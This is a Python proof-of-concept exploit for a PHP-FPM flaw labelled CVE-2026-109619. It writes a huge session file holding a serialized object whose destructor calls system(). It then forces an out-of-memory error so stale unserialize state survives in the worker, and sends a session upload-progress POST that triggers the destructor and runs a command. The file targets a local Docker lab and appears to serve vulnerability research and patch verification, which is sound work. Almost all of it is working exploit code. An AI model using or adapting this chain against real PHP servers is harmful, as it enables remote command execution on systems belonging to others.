#!/usr/bin/env python3
"""
CVE-2026-109619 - FPM Chain E proof of concept.

Producer: GET a session_start() endpoint with a ~30MB session file whose
serialized data starts with an Evil object and then a large string. The
decode allocates the object, then OOMs while allocating the string. The
OOM longjmp skips PHP_VAR_UNSERIALIZE_DESTROY, leaving BG(unserialize)
pointing at the request-owned var_hash (and the Evil object). FPM keeps
the worker because the OOM is post-startup.

Consumer: multipart POST with PHP_SESSION_UPLOAD_PROGRESS to any endpoint,
using a fresh session. The rfc1867 handler runs before normal request
initialization and calls php_var_unserialize_destroy on the stale BG,
which fires Evil::__destruct -> system(cmd).

On patched PHP (8.4.27) the early RINIT resets BG before rfc1867, so the
stale object is never destroyed and no proof is produced.

Usage:
    python3 poc/fpm_chain_e.py --port 8090 --proof lab/out-fpm/p
"""
import argparse
import os
import re
import socket
import subprocess
import time
import uuid

MAKE_SESSION = r'''
class Evil { public $cmd; function __destruct(){ if ($this->cmd) system($this->cmd); } }
$o = new Evil(); $o->cmd = "id>/out/p";
$s = "x|" . serialize([$o, str_repeat("A", 28*1024*1024)]);
file_put_contents("/tmp/sessions/sess_%s", $s);
$o->cmd = "";
'''


def send(host, port, raw, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(raw)
    s.settimeout(timeout)
    out = b""
    while True:
        try:
            d = s.recv(65536)
        except OSError:
            break
        if not d:
            break
        out += d
    s.close()
    return out


def make_producer_session(container, sid):
    code = MAKE_SESSION % sid
    subprocess.run(
        ["docker", "exec", container, "php", "-d", "memory_limit=-1", "-r", code],
        check=True, capture_output=True, text=True)
    subprocess.run(
        ["docker", "exec", container, "chown", "www-data:www-data",
         f"/tmp/sessions/sess_{sid}"], check=True)


def producer(host, port, path, sid):
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    return send(host, port, req, timeout=60)


def consumer(host, port, path, sid):
    b = "V"
    body = (
        f"--{b}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{b}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
        f"--{b}--\r\n"
    ).encode()
    req = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={b}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n"
    ).encode() + body
    return send(host, port, req, timeout=30)


def proof(path):
    try:
        with open(path, "rb") as f:
            data = f.read().decode("latin1").strip()
    except OSError:
        return ""
    return data if re.search(r"uid=\d+", data) else ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8090)
    ap.add_argument("--container", default="php2shell-lab-vuln-fpm-1")
    ap.add_argument("--producer-path", default="/progress.php")
    ap.add_argument("--consumer-path", default="/index.php")
    ap.add_argument("--producer-sid", default="hugesession000000000000000")
    ap.add_argument("--proof", default="lab/out-fpm/p")
    ap.add_argument("--rounds", type=int, default=3)
    a = ap.parse_args()

    try:
        os.unlink(a.proof)
    except OSError:
        pass

    for r in range(1, a.rounds + 1):
        print(f"--- round {r}/{a.rounds}")
        make_producer_session(a.container, a.producer_sid)
        p = producer(a.host, a.port, a.producer_path, a.producer_sid)
        body = p.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in p else p
        if b"memory" in body.lower():
            print("    producer: OOM during session decode")
        else:
            print("    producer: no OOM; body:", body[:120])

        time.sleep(0.1)
        csid = "fresh" + uuid.uuid4().hex[:20]
        c = consumer(a.host, a.port, a.consumer_path, csid)
        status = c.split(b"\r\n", 1)[0].decode("latin1", "replace") if c else "no response"
        text = c.decode("latin1", "replace")
        print(f"    consumer: {status}")
        for marker in ("destruction failed", "Failed to decode", "502", "503"):
            if marker.lower() in text.lower():
                print(f"    consumer marker: {marker}")

        time.sleep(0.5)
        pf = proof(a.proof)
        if pf:
            print(f"PROOF: {pf}")
            return 0
        print("    no proof yet")

    print("[-] no proof produced")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
